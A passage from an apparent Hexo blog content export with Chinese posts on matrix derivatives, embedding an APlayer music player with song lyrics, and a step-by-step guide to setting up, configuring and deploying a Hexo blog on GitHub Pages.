class="strut" style="height:0.714em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.20772em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span></span></span></span>，则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mrow><mi>d</mi><mover accent="true"><mi>y</mi><mo>⃗</mo></mover></mrow><mrow><mi>d</mi><mover accent="true"><mi>x</mi><mo>⃗</mo></mover></mrow></mfrac><mo>=</mo><mi>A</mi></mrow><annotation encoding="application/x-tex">\frac{d \vec{y}}{d \vec{x}}=A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.290908em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.945908em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord accent mtight"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-2.714em;"><span class="pstrut" style="height:2.714em;"></span><span class="mord mtight"><span class="mord mathdefault mtight">x</span></span></span><span style="top:-2.714em;"><span class="pstrut" style="height:2.714em;"></span><span class="accent-body" style="left:-0.20772em;"><span class="overlay mtight" style="height:0.714em;width:0.471em;"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.446108em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord accent mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-2.714em;"><span class="pstrut" style="height:2.714em;"></span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span><span style="top:-2.714em;"><span class="pstrut" style="height:2.714em;"></span><span class="accent-body" style="left:-0.17994em;"><span class="overlay mtight" style="height:0.714em;width:0.471em;"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z'/></svg></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span></span></span></span></li></ul></li><li><p>二次型求导</p><ul><li>f(\vec{x})=\vec{x}^T\cdot A\cdot \vec{x}，则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∇</mi><mi>f</mi><mo>=</mo><mn>2</mn><mi>A</mi><mover accent="true"><mi>x</mi><mo>⃗</mo></mover></mrow><annotation encoding="application/x-tex">\nabla f=2A\vec{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">∇</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.714em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord mathdefault">A</span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.20772em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span></span></span></span></li></ul></li><li><p>矩阵求导应用在证明最小二乘法</p></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> math </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mathematics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>音乐列表</title>
      <link href="/2020/06/03/%E9%9F%B3%E4%B9%90%E5%88%97%E8%A1%A8/"/>
      <url>/2020/06/03/%E9%9F%B3%E4%B9%90%E5%88%97%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>这次尝试添加一个音乐列表</p></blockquote><a id="more"></a><p><a href="https://github.com/MoePlayer/hexo-tag-aplayer/blob/master/docs/README-zh_cn.md">完整示例</a></p>    <div id="aplayer-mfghBkCl" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="60198" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="false" data-listmaxheight="340px" data-preload="none" data-theme="#ad7a86"    ></div><ul><li>代码</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% meting &quot;60198&quot; &quot;netease&quot; &quot;playlist&quot; &quot;autoplay&quot; &quot;mutex:false&quot; &quot;listmaxheight:340px&quot; &quot;preload:none&quot; &quot;theme:#ad7a86&quot;%&#125;</span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> common </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>音乐标签</title>
      <link href="/2020/06/03/%E9%9F%B3%E4%B9%90%E5%90%88%E9%9B%86/"/>
      <url>/2020/06/03/%E9%9F%B3%E4%B9%90%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>这次尝试添加音乐，找到好听的歌能听一上午</p></blockquote><a id="more"></a><div id="aplayer-KYUkDGzt" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;"><pre class="aplayer-lrc-content">[00:02.250]夢ならばどれほどよかったでしょう\n[00:07.800]未だにあなたのことを夢にみる\n[00:13.250]忘れた物を取りに帰るように\n[00:18.100]古びた思い出の埃を払\n[00:26.500]戻らない幸せがあることを\n[00:31.580]最後にあなたが教えてくれた\n[00:37.900]言えずに隠してた昏い過去も\n[00:43.500]あなたがいなきゃ永遠に昏いまま\n[00:49.280]きっともうこれ以上 傷つくことなど\n[00:54.850]ありはしないとわかっている\n[00:59.700]あの日の悲しみさえ\n[01:02.550]あの日の苦しみさえ\n[01:05.330]そのすべてを愛してた あなたとともに\n[01:10.200]胸に残り離れない\n[01:13.700]苦いレモンの匂い\n[01:16.650]雨が降り止むまでは帰れない\n[01:22.140]今でもあなたはわたしの光\n[01:38.690]暗闇であなたの背をなぞった\n[01:44.040]その輪郭を鮮明に覚えている\n[01:49.490]受け止めきれないものと出会うたび\n[01:55.240]溢れてやまないのは涙だけ\n[02:00.940]何をしていたの\n[02:03.780]何を見ていたの\n[02:06.670]わたしの知らない横顔で\n[02:11.400]どこかであなたが今\n[02:14.250]わたしと同じ様な\n[02:17.000]涙にくれ 淋しさの中にいるなら\n[02:22.500]わたしのことなどどうか 忘れてください\n[02:28.300]そんなことを心から願うほどに\n[02:33.900]今でもあなたはわたしの光\n[02:42.520]自分が思うより 恋をしていたあなたに\n[02:53.180]あれから思うように 息ができない\n[03:03.950]あんなに側にいたのにまるで嘘みたい\n[03:15.120]とても忘れられないそれだけが確か\n[03:31.500]あの日の悲しみさえ\n[03:34.350]あの日の苦しみさえ\n[03:36.900]その全てを愛してたあなたと共に\n[03:42.120]胸に残り離れない\n[03:45.450]苦いレモンの匂い\n[03:48.340]雨が降り止むまでは帰れない\n[03:53.660]切り分けた果実の片方の様に\n[03:59.390]今でもあなたはわたしの光</pre></div><script>var ap = new APlayer({element: document.getElementById("aplayer-KYUkDGzt"),narrow: false,autoplay: true,showlrc: 2,music: {title: "Lemon",author: "米津玄師",url: "/music/Lemon.mp3",pic: "http://p1.music.126.net/6IeZ9MiSSDXifj74nzH6ww==/109951163561494000.jpg",}});window.aplayers || (window.aplayers = []);window.aplayers.push(ap);</script><h1 id="安装hexo-tag-aplayer"><a class="markdownIt-Anchor" href="#安装hexo-tag-aplayer"></a> 安装<code>hexo-tag-aplayer</code></h1><ul><li>在hexo根目录安装：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-tag-aplayer</span><br></pre></td></tr></table></figure><h1 id="引入音乐标签"><a class="markdownIt-Anchor" href="#引入音乐标签"></a> 引入音乐标签</h1><ul><li>直接在文章中引入音乐的标签，更多参数信息可查看：<a href="https://github.com/MoePlayer/hexo-tag-aplayer/blob/master/docs/README-zh_cn.md">hexo-tag-aplayer</a></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% aplayer title author url picture_url, narrow, autoplay, width:xxx, lrc:xxx %&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>title</td><td>曲目标题</td></tr><tr><td>authhor</td><td>曲目作者</td></tr><tr><td>url</td><td>音乐文件 URL 地址</td></tr><tr><td>picture_url</td><td>(可选) 音乐对应的图片地址</td></tr><tr><td>narrow</td><td>(可选) 播放器袖珍风格</td></tr><tr><td>autoplay</td><td>(可选) 自动播放，移动端浏览器暂时不支持此功能</td></tr><tr><td>width:xxx</td><td>(可选) 播放器宽度 (默认: 100%)</td></tr><tr><td>lrc:xxx</td><td>(可选) 歌词文件 URL 地址</td></tr></tbody></table><h1 id="引入歌词标签"><a class="markdownIt-Anchor" href="#引入歌词标签"></a> 引入歌词标签</h1><ul><li>带歌词的标签引用方法</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% aplayerlrc &quot;Lemon&quot; &quot;米津玄師&quot; &quot;http:&#x2F;&#x2F;m8.music.126.net&#x2F;20200603090007&#x2F;f4d77ea62e53253a314abb2cc26dde41&#x2F;ymusic&#x2F;29dc&#x2F;f29a&#x2F;d863&#x2F;04d4d27f10493306367eae2ee4742894.mp3&quot; &quot;http:&#x2F;&#x2F;p1.music.126.net&#x2F;6IeZ9MiSSDXifj74nzH6ww&#x3D;&#x3D;&#x2F;109951163561494000.jpg&quot; &quot;autoplay&quot; %&#125;</span><br><span class="line">[00:02.250]夢ならばどれほどよかったでしょう</span><br><span class="line">[00:07.800]未だにあなたのことを夢にみる</span><br><span class="line">[00:13.250]忘れた物を取りに帰るように</span><br><span class="line">&#123;% endaplayerlrc %&#125;</span><br></pre></td></tr></table></figure><h1 id="获取网易云音乐"><a class="markdownIt-Anchor" href="#获取网易云音乐"></a> 获取网易云音乐</h1><ul><li><p>获取歌曲</p><ul><li>打开网易云音乐，找到你打算下载的歌，然后截取歌曲链接的id：<code>https://music.163.com/#/song?id=451703096</code></li><li>拼接获取歌曲的链接：<code>http://music.163.com/song/media/outer/url?id=歌曲的ID.mp3</code></li><li>然后复制到浏览器打开可以直播播放，Ctrl+S 可以下载</li></ul></li><li><p>获取歌词资源</p><ul><li>获取歌词也是，找到你要找的歌，然后截取歌曲链接的id：<code>https://music.163.com/#/song?id=451703096</code></li><li>拼接歌词链接：<code>http://music.163.com/api/song/media?id=歌曲的ID</code></li></ul></li></ul><p><a href="https://liwenhau.github.io/2019/11/15/blogAddMusic/#1-%E8%8E%B7%E5%8F%96%E6%AD%8C%E6%9B%B2%E8%B5%84%E6%BA%90">原文链接</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> common </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo搭建博客记录</title>
      <link href="/2020/05/30/first/"/>
      <url>/2020/05/30/first/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>之前的博客很多图都挂掉了，想重新改改，但是恢复好像难度比较大。所以索性重新建了一个博客，顺便把创建博客的过程记录一下吧。</p></blockquote><a id="more"></a><h2 id="准备工作"><a class="markdownIt-Anchor" href="#准备工作"></a> 准备工作</h2><h3 id="github"><a class="markdownIt-Anchor" href="#github"></a> <a href="https://github.com">github</a>操作</h3><ul><li>创建仓库<br />在<code>github</code>新建一个以你的用户名命名的仓库：<code>用户名.github.io</code>，这样将来访问地址就是：<code>http://用户名.githu.io</code>了。所以，每个github账户只能创建一个可以直接使用域名访问的仓库。</li><li>生成<code>ssh</code>添加到<code>github</code></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;yourname&quot;</span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br><span class="line">ssh-keygen -t rsa -C &quot;youremail&quot;</span><br></pre></td></tr></table></figure><h3 id="安装nodejs和npm"><a class="markdownIt-Anchor" href="#安装nodejs和npm"></a> 安装node.js和npm</h3><ul><li>windows：<code>nodejs</code>选择<code>LTS</code>版本就行了。</li><li>linux：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install nodejs</span><br><span class="line">sudo apt-get install npm</span><br></pre></td></tr></table></figure><ul><li>安装完后，打开命令行</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure><ul><li>检查一下有没有安装成功。</li></ul><h3 id="安装git"><a class="markdownIt-Anchor" href="#安装git"></a> 安装git</h3><ul><li>windows：到<code>git</code>官网上下载,<a href="https://gitforwindows.org/">Download git</a>,下载后会有一个<code>Git Bash</code>的命令行工具，以后就用这个工具来使用git。</li><li>linux：对<code>linux</code>来说实在是太简单了，因为最早的<code>git</code>就是在<code>linux</code>上编写的，只需要一行代码</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><h3 id="安装hexo"><a class="markdownIt-Anchor" href="#安装hexo"></a> 安装hexo</h3><ul><li>前面<code>git</code>和<code>nodejs</code>安装好后，就可以安装<code>hexo</code>了，你可以先创建一个文件夹<code>blog</code>，然后cd到这个文件夹下（或者在这个文件夹下直接右键<code>git bash</code>打开）</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><ul><li>依旧用<code>hexo -v</code>查看一下版本。</li><li>然后执行下面代码就可以搭建项目了</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init myblog</span><br><span class="line">cd myblog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><ul><li>搭建完成之后，查看<code>npm</code> 安装各 <code>hexo</code> 插件的情况</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm ls --depth 0</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-0.png" alt="缺失包名的提示" /></p><ul><li>解决该问题，需要逐一安装缺失的包</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 根据提示，注意安装缺失的依赖包</span><br><span class="line">npm install hexo-generator-archive --save</span><br><span class="line"># 更改主题后报错</span><br><span class="line">npm install --save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive</span><br><span class="line"># 本地预览工具，使用&#96;hexo server&#96;或者&#96;hexo s&#96;即可预览项目</span><br><span class="line">npm install hexo-server --save</span><br><span class="line"># hexo部署插件</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line"># 搜索组件</span><br><span class="line">npm install --save hexo-generator-search</span><br><span class="line"># 卸载mathJax组件，安装KaTex</span><br><span class="line">npm un hexo-renderer-marked --save</span><br><span class="line">npm un hexo-renderer-kramed --save</span><br><span class="line">npm un hexo-math --save</span><br><span class="line">npm i @upupming&#x2F;hexo-renderer-markdown-it-plus --save</span><br><span class="line"># 音乐播放器</span><br><span class="line">npm install --save hexo-tag-aplayer</span><br></pre></td></tr></table></figure><ul><li>安装完后重新构建建立的<code>hexo</code>项目即可解决。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 清除缓存</span><br><span class="line">hexo clean</span><br><span class="line"># 生成静态文件</span><br><span class="line">hexo g</span><br></pre></td></tr></table></figure><h3 id="hexo-admin插件"><a class="markdownIt-Anchor" href="#hexo-admin插件"></a> hexo-admin插件</h3><ul><li>安装插件</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-admin</span><br></pre></td></tr></table></figure><ul><li>启动服务器。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo server -d</span><br></pre></td></tr></table></figure><ul><li>即可在<code>localhost:4000/admin/</code>中编辑博文了。</li><li>然后，<code>Deploy</code>之前，还需要编辑配置文件<code>_config.yml</code>。(否则会出现<code>Error: Config value &quot;admin.deployCommand&quot; not found</code>或者<code>Error: spawn hexo ENOENT</code>之类的报错。)<ul><li>Windows则在末尾加上<br /><img src="/images/pasted-1.png" alt="_config.xml的配置" /></li></ul></li><li>然后在同级目录新建<code>hexo-pubish.bat</code>文件，文件内容如下：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g -d</span><br></pre></td></tr></table></figure><ul><li>linux<ul><li>create deploy-script in project dir:</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ touch hexo-deploy.sh; chmod a+x hexo-deploy.sh</span><br></pre></td></tr></table></figure><pre><code>- with such 2 lines for example or any custom code:</code></pre><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env sh</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure><pre><code>- and edit _config.yml:</code></pre><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin:</span><br><span class="line">  deployCommand: &#39;.&#x2F;hexo-deploy.sh&#39;</span><br></pre></td></tr></table></figure><ul><li>编辑完毕后，就可以点击<code>Deploy</code>，直接部署发布<code>Github</code>博客上。<br /><img src="/images/pasted-2.png" alt="点击deploy部署" /></li><li>PS：关于<code>Hexo Admin</code>插入图片<ul><li><code>Hexo Admin</code>可以直接复制图片粘贴，然后自动下载到<code>source/images</code>目录并重命名。但在<code>Windows</code>中粘贴后会出现裂图。这时就需要手动把括号中的前后两个斜杠去掉，就能正常显示。</li></ul></li><li>密码保护<ul><li>打开<code>setting</code>，点击<code>Setup authentification here</code>输入用户名，密码，密钥，下面会自动生成配置文件，复制加在<code>hexo</code>根目录下的<code>_config.yml</code>中：</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin:</span><br><span class="line">  username: myfavoritename</span><br><span class="line">  password_hash: be121740bf988b2225a313fa1f107ca1</span><br><span class="line">  secret: a secret something</span><br></pre></td></tr></table></figure><ul><li>重启<code>hexo</code>，就可以看到登录页面了</li><li>发布文章<ul><li>进入后台之后点击<code>Deploy</code>，里面的<code>Deploy</code>按钮是用来执行发布脚本的，所以我们先在博客根目录下新建个目录<code>admin_script</code>，然后在目录中新建一个脚本<code>hexo-g.sh</code>，里面写下下面代码然后保存，</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure><ul><li>然后给<code>hexo-g.sh</code>加入可执行权限</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x hexo-d.sh</span><br></pre></td></tr></table></figure><ul><li>然后在<code>_config.yml</code>中的<code>admin</code>下添加</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin:</span><br><span class="line">  username: myfavoritename</span><br><span class="line">  password_hash: be121740bf988b2225a313fa1f107ca1</span><br><span class="line">  secret: a secret something</span><br><span class="line">  deployCommand: .&#x2F;admin_script&#x2F;hexo-d.sh</span><br></pre></td></tr></table></figure><ul><li>设置发布执行的脚本，点击<code>Deploy</code>就会执行这个命令并提交到<code>GitHub</code>上。</li></ul><h3 id="绑定域名"><a class="markdownIt-Anchor" href="#绑定域名"></a> 绑定域名</h3><ul><li>如果有了域名，可以将域名和上一步建立的仓库进行绑定<ul><li>首先在终端中<code>ping</code>一下仓库网址，获取<code>IP</code>，<code>ping 用户名.github.com</code></li><li>配置域名的<code>CNAME</code>的指向获取的<code>IP</code></li><li>登录<code>GitHub</code>，进入之前创建的仓库，点击<code>settings</code>，设置<code>Custom domain</code>，输入你的域名<code>fangzh.top</code></li><li>然后在你的博客文件<code>source</code>中创建一个名为<code>CNAME</code>文件，不要后缀。写上你的域名。</li></ul></li><li>过不了多久，再打开你的浏览器，输入你自己的域名，就可以看到搭建的网站啦！</li></ul><h2 id="hexo的使用"><a class="markdownIt-Anchor" href="#hexo的使用"></a> hexo的使用</h2><h3 id="创建项目"><a class="markdownIt-Anchor" href="#创建项目"></a> 创建项目</h3><ul><li><code>hexo</code>安装完成后，接下来初始化一下<code>hexo</code></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init [项目名称]</span><br><span class="line">cd [项目名称]</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><ul><li>项目文件夹会生成以下的目录</li></ul><table><thead><tr><th>目录名</th><th>作用</th></tr></thead><tbody><tr><td>node_modules</td><td>依赖包</td></tr><tr><td>public</td><td>存放生成的页面</td></tr><tr><td>scaffolds</td><td>生成文章的一些模板</td></tr><tr><td>source</td><td>用来存放你的文章</td></tr><tr><td>themes</td><td>主题</td></tr><tr><td>_config.yml</td><td>博客的配置文件</td></tr></tbody></table><h3 id="项目配值"><a class="markdownIt-Anchor" href="#项目配值"></a> 项目配值</h3><ul><li>在文件根目录下的<code>_config.yml</code>，就是整个<code>hexo</code>框架的配置文件了。可以在里面修改大部分的配置。详细可参考<a href="https://hexo.io/zh-cn/docs/configuration">官方的配置</a>描述。</li></ul><h4 id="网站配置"><a class="markdownIt-Anchor" href="#网站配置"></a> 网站配置</h4><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td>网站标题</td></tr><tr><td>subtitle</td><td>网站副标题</td></tr><tr><td>description</td><td>网站描述</td></tr><tr><td>author</td><td>您的名字</td></tr><tr><td>language</td><td>网站使用的语言</td></tr><tr><td>timezone</td><td>网站时区。Hexo 默认使用您电脑的时区。时区列表。比如说：America/New_York, Japan, 和 UTC 。</td></tr></tbody></table><ul><li>其中，<code>description</code>主要用于<code>SEO</code>，告诉搜索引擎一个关于您站点的简单描述，通常建议在其中包含您网站的关键词。<code>author</code>参数用于主题显示文章的作者。</li></ul><h4 id="网址配置"><a class="markdownIt-Anchor" href="#网址配置"></a> 网址配置</h4><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>url</td><td>网址</td></tr><tr><td>root</td><td>网站根目录</td></tr><tr><td>permalink</td><td>文章的链接格式</td></tr><tr><td>permalink_defaults</td><td>永久链接中各部分的默认值</td></tr></tbody></table><ul><li>关于permalink链接的变量可以去<a href="https://hexo.io/zh-cn/docs/permalinks">官网上查找</a></li></ul><h4 id="主题配置theme"><a class="markdownIt-Anchor" href="#主题配置theme"></a> 主题配置（theme）</h4><h5 id="更换主题"><a class="markdownIt-Anchor" href="#更换主题"></a> 更换主题</h5><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>theme</td><td>landscape</td></tr></tbody></table><ul><li>theme就是选择什么主题，也就是在<code>theme</code>这个文件夹下，在<a href="https://hexo.io/themes/">hexo主题推荐官网</a>上有很多个主题，默认给你安装的是lanscape这个主题。其他的主题参数配置可以查询：<a href="(https://hexo.io/zh-cn/docs/themes.html)">官网链接</a></li><li>当你需要更换主题时，可以在官网上下载</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;theme-next&#x2F;hexo-theme-next themes&#x2F;next</span><br><span class="line">$ git clone -b master&#x2F;dev https:&#x2F;&#x2F;..  # 克隆指定分支的代码</span><br><span class="line">$ cd themes&#x2F;next</span><br><span class="line">$ git tag -l  # 查看该主题的版本列表</span><br><span class="line">$ git checkout v1.7.0   # 选择版本</span><br></pre></td></tr></table></figure><ul><li>主题文件夹中的<code>_config.xml</code>是主题的相关配置，具体可以根据主题帮助文档更改就可以了。</li></ul><h5 id="主题推荐"><a class="markdownIt-Anchor" href="#主题推荐"></a> 主题推荐</h5><ul><li>hexo主题不少，看个人喜好，我总结了几个网上推荐并且比较多人用的主题。<ul><li><a 